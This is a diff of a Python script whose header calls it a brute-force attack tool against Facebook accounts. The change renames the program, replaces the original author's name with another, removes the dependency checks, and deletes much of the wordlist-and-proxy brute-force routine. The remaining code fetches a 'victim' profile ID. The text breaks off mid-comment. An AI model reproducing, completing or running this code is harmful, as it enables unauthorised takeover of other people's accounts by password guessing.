@@ -1,10 +1,9 @@
-#!/usr/bin/python
 # -*- coding: utf-8 -*-
 
 ##################################
-# Program Name: Faceboom ~ v 1.1.0
+# Program Name: Facebook ~ v 1.1.0
 # Working : Brute Force Attack on Facebook Accounts
-# Author : Hassan Tahir
+# Autor : kamilpaczkowski
 ##################################
 
 # Imported Libraries
@@ -14,22 +13,11 @@ import os
 import optparse
 import random
 import re
-
-try:
-    import requests
-except ImportError:
-    print("[!] Error: [ requests ] Module Is Missing \n[*] Please Install it Using this command> [ pip install requests ]")
-    exit(1)
-
-try:
-    import mechanize
-except ImportError:
-    print("[!] Error: [ mechanize ] Module Is Missing \n[*] Please Install it Using this command> [ pip install mechanize ]")
-    exit(1)
-
-os.system("cls||clear")
+import requests
+import mechanize
 
 # Colors
+blue = "\033[1;34m"
 wi = "\033[1;37m"
 rd = "\033[1;31m"
 gr = "\033[1;32m"
@@ -74,35 +62,9 @@ def ID(url):
         idre = re.compile('"entity_id":"([0-9]+)"')
         con = requests.get(url).content
         idis = idre.findall(con)
-        print(gr + "\n[" + wi + "*" + gr + "] Target Profile" + wi + " ID: " + yl + idis[0] + wi)
+        print(blue + "\n[" + wi + "*" + blue + "] Target Profile" + wi + " ID: " + yl + idis[0] + wi)
     except IndexError:
         print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Victim Profile URL " + rd + "!!!" + wi)
         exit(1)
 
-# Brute Force Main Frame
-def FBOM(username, wordlist, proxy=None, passwd=None):
-    if passwd is None:
-        if not os.path.isfile(wordlist):
-            print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " No Such File: [ " + rd + str(wordlist) + yl + " ] " + rd + "!!!" + wi)
-            exit(1)
-    if not cnet():
-        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Internet Connection " + rd + "!!!" + wi)
-        exit(1)
-
-    if proxy is not None:
-        print(wi + "[" + yl + "~" + wi + "] Connecting To " + wi + "Proxy[\033[1;33m {} \033[1;37m]...".format(
-            proxy if ":" not in proxy else proxy.split(":")[0]))
-        if ":" not in proxy:
-            if proxy.count(".") == 3:
-                if cpro(proxy):
-                    print(wi + "[" + gr + "Connected" + wi + "]")
-                    useproxy = proxy + ":8080"
-                else:
-                    if cpro(proxy, port=80):
-                        print(wi + "[" + gr + "Connected" + wi + "]")
-                        useproxy = proxy + ":80"
-                    else:
-                        print(rd + "[" + yl + "Connection Failed" + rd + "] !!!" + wi)
-                        useproxy = False
-                        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Invalid HTTP/S Proxy[" + rd + str(
-                            proxy) + yl + "]"
+# Brute
